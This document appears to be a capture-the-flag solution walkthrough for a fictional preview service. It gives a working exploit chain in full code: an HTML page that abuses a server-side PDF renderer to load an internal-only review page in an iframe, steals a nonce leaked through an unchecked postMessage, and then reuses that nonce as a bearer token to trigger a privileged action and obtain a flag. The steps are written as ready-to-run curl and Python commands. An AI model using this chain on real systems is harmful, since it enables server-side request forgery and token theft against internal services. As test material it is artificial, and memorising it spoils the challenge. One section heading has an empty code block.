## Prerequisite

`action_nonce` in the review record. It did not return the nonce. The nonce is
sent only by the internal review-session page through `postMessage`.

## Read the developer token

```

```

## Craft the nonce-capture page

The review-session page at `http://127.0.0.1:9000/review-session/PRV-771` sends
the nonce with `postMessage(..., "*")` and does not check the receiver origin.
You cannot reach `127.0.0.1:9000` yourself. Chromium inside the renderer can.
The page below loads that session page in an iframe, captures the nonce, and
writes it into the body so it appears in the rendered PDF.

```
cat > /tmp/capture.html <<'HTML'
<!DOCTYPE html>
<html><body>
<div id="out">NONCE-PENDING</div>
<iframe src="http://127.0.0.1:9000/review-session/PRV-771"></iframe>
<script>
window.addEventListener('message', function(e) {
  if (e.data && e.data.action_nonce) {
    document.getElementById('out').textContent = 'NONCE-CAPTURED:' + e.data.action_nonce;
  }
});
</script>
</body></html>
HTML
```

## Render the page and read the PDF

```
python3 -c 'import json;print(json.dumps({"html":open("/tmp/capture.html").read(),"source_id":"sup-k-2841"}))' > /tmp/render_req.json
curl -sk -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  --data-binary @/tmp/render_req.json \
  https://preview.keplerops.test/api/preview/render > /tmp/render_resp.json
python3 -c 'import json,base64;open("/tmp/render.pdf","wb").write(base64.b64decode(json.load(open("/tmp/render_resp.json"))["pdf_base64"]))'
NONCE=$(pdftotext /tmp/render.pdf - | sed -n 's/.*NONCE-CAPTURED:\([0-9a-f]\{32\}\).*/\1/p' | head -1)
echo "nonce=$NONCE"
```

## Use the nonce to prepare the review

```
curl -sk -H "Authorization: Bearer $NONCE" -X POST \
  https://preview.keplerops.test/api/preview/reviews/PRV-771/prepare
```

Expected output:

```json
{"flag":"FLAG{9d14e5b959bb4bb5}","prepared":true,"queue":"privileged-review","result_id":"PRVPRP-...","review_id":"PRV-771","schema":"fieldkest.preview-preparation/v1","source_id":"doc-9bc054d6f95dfa6a"}
```

The nonce is consumed on first use. PRV-771 moves to state=prepared. The K12.3
worker renders it next.
